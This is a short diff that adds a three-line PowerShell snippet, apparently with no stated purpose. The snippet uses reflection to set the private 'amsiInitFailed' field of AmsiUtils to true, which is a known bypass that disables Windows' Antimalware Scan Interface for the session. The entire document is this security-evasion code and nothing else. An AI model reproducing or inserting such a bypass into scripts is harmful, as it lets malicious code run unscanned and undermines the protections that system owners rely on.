@@ -1,0 +1,3 @@
+$amsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$field = $amsiUtils.GetField('amsiInitFailed', [System.Reflection.BindingFlags]'NonPublic,Static')
+$field.SetValue($null, $true)
